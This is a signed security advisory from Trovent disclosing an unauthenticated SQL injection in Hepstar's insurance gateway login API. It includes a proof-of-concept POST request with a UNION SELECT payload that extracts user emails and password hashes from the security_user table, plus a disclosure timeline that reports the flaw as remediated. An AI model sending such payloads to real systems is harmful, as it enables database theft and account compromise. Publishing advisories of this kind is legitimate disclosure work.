@@ -1,0 +1,89 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# Trovent Security Advisory 2004-01 #
+#####################################
+
+
+SQL injection in login API endpoint
+###################################
+
+
+Overview
+########
+
+Advisory ID: TRSA-2004-01
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2004-01
+Affected product: Web application https://production.gateway.insure
+Affected version: N/A
+Vendor: Hepstar Financial Services (Pty) Ltd, https://www.hepstar.com
+Credits: Trovent Security GmbH, Stefan Pietsch
+
+
+Detailed description
+####################
+
+Trovent Security GmbH discovered an SQL injection vulnerability in a web
+application of Hepstar. An attacker is able to execute SQL commands without
+authentication. It is possible to read data from all tables of the database.
+
+Severity: Critical
+CVSS Score: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+CVE ID: N/A
+CWE ID: CWE-89
+
+Note:
+Trovent Security GmbH did not perform a penetration test of the web application.
+
+
+Proof of concept
+################
+
+Sample HTTP request used to verify the vulnerability:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+POST /authentication/rest/login HTTP/1.1
+Host: production.gateway.insure
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Connection: close
+
+username=x'%20UNION%20SELECT%20SUBSTRING(GROUP_CONCAT(email,'|',password),1,1024),11,11,12345,11,11%20FROM%20security_user--%20-&password=y
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+Application source code has to be modified to fix the vulnerability.
+
+
+History
+#######
+
+2020-04-17: Vulnerability found, vendor contacted
+2020-04-20: Vendor replied, asking for details
+2020-04-21: Vulnerability details reported to vendor
+2020-04-22: Trovent verified remediation of the vulnerability
+2020-05-16: Advisory published
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCgAdFiEE0wArIZvu5AKY9ZSXzx6v/h6FjrcFAl7CdmYACgkQzx6v/h6F
+jrf+AQ/+LnXU5RmwhgVwkDDs6zA+MIbZMzH272SGKeKrJmeo8qN7gwwqvUnngVNP
+gcetWRTsXNeI55InrPmKVlAVlK98R7QXE/ZJxXbRG0Wf15JsBAmuwA5CO08RLzSk
+jH4cm94ESp+vQUjpFY+jUA0iUrIds+Jde1En1g5qBDLuTMBlSSMymJu7VWZN6q+L
+Gt9lfIJ5/svNWPeJwwcPsDDcPbpM1Qfi1omC5Q4v0G0hyQXx9KLjBnX83NYL08BV
+D8LmXzaPrRNvDgbrauRVwX8AnGkGCPpYJU5ahANl9syH+wvi4ucj+oc8G+WWqcav
+hXx1uf5D2bwib7RUjxD1uSlipc5q3287YdYoWSgMrqet4WBtM4RBuEbRUbDPjlDF
+5tItXVb0bGMxaq7yHbUIHIeW98kbzT5LzpHj8yxZIBb+YC6muig+SDyX1xFaEUDE
+joVbtjBFRpYiIPY697RE1sIloeqGHC/bOjRRC8JMh84Fh7Bk3ldwLuow1Q2vJg6B
+Ao3XhA4sBmVHlBNGPd1YtLhpessZlIF08tpzTrRTgI0Hrzld7gxGtqRwApxnRJbK
+S3cAVdVOQo8aRkm2FjDTXN1Z08CPOuZDHjjhgvjAKs6zrIaejx2JIZvbMqsLfaO4
+4PEWK+A0f28W66TJ3xVNeliFTuXmjtaF350wWiNp7nNlmFW3QNY=
+=bCu9
+-----END PGP SIGNATURE-----
